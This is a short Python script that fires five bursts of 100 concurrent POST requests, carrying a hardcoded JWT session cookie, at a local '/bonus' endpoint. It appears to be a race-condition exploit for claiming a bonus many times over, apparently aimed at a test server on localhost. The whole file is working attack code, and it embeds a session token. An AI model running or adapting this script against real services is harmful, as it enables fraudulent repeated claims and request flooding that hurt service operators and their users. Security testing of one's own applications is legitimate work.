import asyncio
from random import randint
import aiohttp

async def send_post_request(url, cookies):
    async with aiohttp.ClientSession() as session:
        async with session.post(url, cookies=cookies) as response:
            return await response.text()


async def main(target_utl, cookie):
    print(f"Start Bombarding url={target_utl}, cookie={cookie}")
    cookie_param = {'jwt': cookie}
    for _ in range(5):
        async with asyncio.TaskGroup() as tg:
            for _ in range(100):
                tg.create_task(send_post_request(target_utl, cookie_param))
        await asyncio.sleep(0.5)


if __name__ == "__main__":
    asyncio.run(
        main(
            'http://localhost:9090/bonus',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDQyMjM4NzksInVzZXJfaWQiOjN9.dQHAW9WlgsfVbYHH3zwngxlqQBf037953MMf0HI8nYM'
        )
    )
